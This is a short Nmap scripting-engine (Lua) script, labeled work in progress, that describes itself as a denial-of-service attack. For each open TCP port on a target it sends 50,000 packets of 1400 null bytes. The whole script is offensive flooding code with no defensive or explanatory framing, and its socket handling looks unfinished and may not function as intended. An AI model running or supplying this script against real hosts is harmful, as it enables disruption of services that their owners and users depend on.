-- work in progress

description = [[
    attempts to carry out a denial of service attack against an IP through open ports
]]

author = "Asko7779"
license = "Same as Nmap"
categories = {"intrusive", "dos"}

portrule = function(host, port)
    return port.protocol == "tcp" and port.state == "open"
end

action = function(host, port)
    local packet_size = 1400
    local tcp_payload = string.rep("\0", packet_size)

    for i = 1, 50000 do
        local socket = nmap.new_socket()
        
        local success, err = socket:sendto(tcp_payload, host.ip, port.number)
        if not success then
            return "[-] Error sending TCP packet: " .. err
        end

        socket:close()
        stdnse.print_debug("Sent TCP packet to " .. host.ip .. " through port " .. port.number)
    end

    return "Sent TCP packets to " .. host.ip .. " on port " .. port.number
end
